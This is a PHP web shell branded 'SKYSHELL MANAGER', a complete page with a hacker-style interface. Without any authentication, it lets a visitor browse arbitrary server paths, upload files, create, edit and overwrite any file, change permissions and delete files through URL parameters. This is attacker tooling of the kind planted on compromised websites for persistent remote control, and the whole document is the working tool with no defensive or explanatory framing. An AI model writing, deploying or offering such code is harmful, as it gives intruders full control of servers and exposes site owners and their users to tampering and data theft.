<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ＳＫＹＳＨＥＬＬ ＭＡＮＡＧＥＲ</title>
  <style>
    body {
      background-color: #111;
      color: #0f0;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
    }

    h2 {
      text-align: center;
      font-size: 36px;
      font-weight: bold;
      margin: 10px 0;
      position: relative;
      background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff);
      background-size: 200%;
      color: transparent;
      -webkit-background-clip: text;
      animation: gradientAnimation 3s linear infinite;
    }

    @keyframes gradientAnimation {
      0% { background-position: 200% 0%; }
      50% { background-position: 0% 100%; }
      100% { background-position: 200% 0%; }
    }

    .php-version { position: absolute; top: 10px; right: 20px; font-size: 14px; color: #0ff; }
    a { color: #6cf; text-decoration: none; }
    a:hover { text-decoration: underline; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 10px; border: 1px solid #333; transition: background 0.3s, color 0.3s; }
    tr:hover { background-color: #32CD32; }
    tr:hover td a.filename-link { color: #000; font-weight: bold; }
    .filename-link { color: #0ff; }
    .action-cell { text-align: right; }
    input, button, textarea {
      background: #222;
      color: #0f0;
      border: 1px solid #444;
      padding: 5px 10px;
      margin: 5px 0;
    }
    button { cursor: pointer; }
    .alert-message {
      color: #32CD32;
      background-color: #222;
      padding: 10px;
      text-align: center;
      font-size: 18px;
      margin: 20px 0;
    }
    .file-upload-container { display: flex; justify-content: space-between; align-items: center; }
    .emoji { color: #fff; }
    .path-display a { color: #fff; text-decoration: underline; }
  </style>
</head>
<body>

<h2><span class="emoji">📁</span> ＳＫＹＳＨＥＬＬ ＭＡＮＡＧＥＲ-<span class="emoji">🛒</span>
  <span class="php-version">PHP v<?= phpversion(); ?></span>
</h2>

<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
$alertMessage = "";

// Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $path . DIRECTORY_SEPARATOR . $filename)) {
        $alertMessage = "File uploaded successfully!";
    } else {
        $alertMessage = "File upload failed!";
    }
}

// Create folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfolder'])) {
    $folder = $path . DIRECTORY_SEPARATOR . $_POST['newfolder'];
    if (!file_exists($folder)) {
        mkdir($folder);
        $alertMessage = "Folder created successfully!";
    } else {
        $alertMessage = "Folder already exists!";
    }
}

// Create file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newfile'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_POST['newfile'];
    if (!file_exists($file)) {
        file_put_contents($file, '');
        $alertMessage = "File created successfully!";
    } else {
        $alertMessage = "File already exists!";
    }
}

// Change permission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chmod_file'], $_POST['chmod_value'])) {
    $file = $_POST['chmod_file'];
    $perm = $_POST['chmod_value'];
    if (file_exists($file)) {
        chmod($file, octdec($perm));
        $alertMessage = "Permissions changed successfully!";
    } else {
        $alertMessage = "File does not exist!";
    }
}

// Delete
if (isset($_GET['delete'])) {
    $file = urldecode($_GET['delete']);
    if (file_exists($file)) {
        unlink($file);
        header("Location: ?path=" . urlencode(dirname($file)));
        exit;
    }
}

// Save Edited File
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file_path'], $_POST['edited_content'])) {
    $filePath = $_POST['edit_file_path'];
    $newContent = $_POST['edited_content'];
    if (file_exists($filePath)) {
        file_put_contents($filePath, $newContent);
        $alertMessage = "File updated successfully!";
    } else {
        $alertMessage = "File does not exist!";
    }
}
?>

<?php if ($alertMessage): ?>
  <div class="alert-message"><?= $alertMessage ?></div>
<?php endif; ?>

<div class="file-upload-container">
  <div>
    <form method="post">
      <input type="text" name="newfolder" placeholder="📁 New Folder" required>
      <button type="submit">Create Folder</button>
    </form>
    <form method="post">
      <input type="text" name="newfile" placeholder="📄 New File" required>
      <button type="submit">Create File</button>
    </form>
  </div>
  <div>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="file" onchange="this.form.submit()">
    </form>
  </div>
</div>

<!-- Current Path Display -->
<p class="path-display"><b>Current Path:</b>
<?php
$parts = explode(DIRECTORY_SEPARATOR, $path);
$build = '';
foreach ($parts as $part) {
    if ($part == '') continue;
    $build .= DIRECTORY_SEPARATOR . $part;
    echo "<a href='?path=" . urlencode($build) . "'>$part</a>/";
}
?>
</p>

<!-- File Table -->
<table>
  <tr>
    <th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th>
  </tr>
<?php
$files = scandir($path);
usort($files, function ($a, $b) use ($path) {
    return is_dir($path . DIRECTORY_SEPARATOR . $b) - is_dir($path . DIRECTORY_SEPARATOR . $a);
});
foreach ($files as $file) {
    if ($file == '.') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    $isDir = is_dir($full);
    $perm = substr(sprintf('%o', fileperms($full)), -4);
    $size = $isDir ? '-' : filesize($full);
    echo "<tr>";
    echo "<td>" . ($isDir ? "📁" : "📄") . " <a class='filename-link' href='?path=" . urlencode($full) . "'>$file</a></td>";
    echo "<td>" . ($isDir ? '-' : round($size / 1024, 2) . ' KB') . "</td>";
    echo "<td>$perm</td>";
    echo "<td class='action-cell'>
            <a href='?delete=" . urlencode($full) . "'>🗑️</a>
            " . (!$isDir ? "<a href='$full' download>⬇️</a> <a href='?edit=" . urlencode($full) . "'>✏️</a>" : "") . "
            <form method='post' style='display:inline;'>
                <input type='hidden' name='chmod_file' value='$full'>
                <input type='text' name='chmod_value' placeholder='Perm' style='width:60px;'>
                <button type='submit'>🔒</button>
            </form>
          </td>";
    echo "</tr>";
}
?>
</table>

<!-- Edit File Section -->
<?php if (isset($_GET['edit']) && is_file($_GET['edit'])):
  $fileToEdit = $_GET['edit'];
  $content = htmlspecialchars(file_get_contents($fileToEdit));
?>
  <h3 style="color:#fff;">Editing: <?= basename($fileToEdit) ?></h3>
  <form method="post">
    <input type="hidden" name="edit_file_path" value="<?= htmlspecialchars($fileToEdit) ?>">
    <textarea name="edited_content" rows="20" style="width:100%;background:#111;color:#0f0;border:1px solid #444;"><?= $content ?></textarea><br>
    <button type="submit">💾 Save Changes</button>
  </form>
<?php endif; ?>

</body>
</html>
